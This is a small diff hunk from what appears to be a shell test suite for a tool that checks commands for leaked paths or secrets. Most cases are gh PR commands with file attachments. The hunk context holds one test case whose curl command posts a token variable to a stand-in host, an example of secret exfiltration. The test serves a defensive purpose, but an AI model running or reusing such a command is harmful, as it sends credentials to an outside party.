@@ -124,7 +124,7 @@ quiet "token sent to another host" "curl -d '$TOK' https://example.test/hook"
 # gh uploads an --attach file and posts its alt text (after `#`) or its base
 # name, never its directory.
 AHP="/ho""me/alice/wt"
-AWP='C:\Use''rs\alice\wt'
+AWP='C:\Use''rs\alice\proj'
 quiet "attach beside a body file" "gh pr edit 5340 --repo o/r --body-file plain.md --attach $AHP/evidence/figma/built-banner-resized.png"
 quiet "attach with alt text" "gh pr comment 5340 --body 'see shot' --attach '$AHP/evidence/a.png#Banner before resize'"
 quiet "attach with a comma in the alt text" "gh pr comment 5340 --body 'see shot' --attach '$AHP/a.png#Banner, before resize'"
